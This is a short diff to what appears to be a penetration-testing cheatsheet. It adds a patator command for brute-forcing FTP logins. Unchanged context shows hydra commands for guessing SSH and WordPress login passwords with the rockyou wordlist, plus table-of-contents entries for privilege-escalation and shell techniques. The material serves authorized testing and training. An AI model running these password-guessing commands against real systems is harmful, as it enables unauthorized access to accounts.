@@ -17,10 +17,6 @@
 * [Juicy Potato](#juicy-potato)
 * [Shell via Samba Logon Command](#shell-via-samba-logon-command)
 
-# Cheatsheet - Buffer Overflows (BOF)
-
-
-
 # Cheatsheet - Password Guessing
 ## Table of Contents
 * [Online](#online)
@@ -35,6 +31,10 @@
 ```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t4 ssh
 hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/blog/wp-login.php?:log=^USER^&pwd=^PASS^:Error"
+```
+
+```bash
+patator ftp_login host=$TARGET user=$USER password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
 ```
 
 ### Crowbar
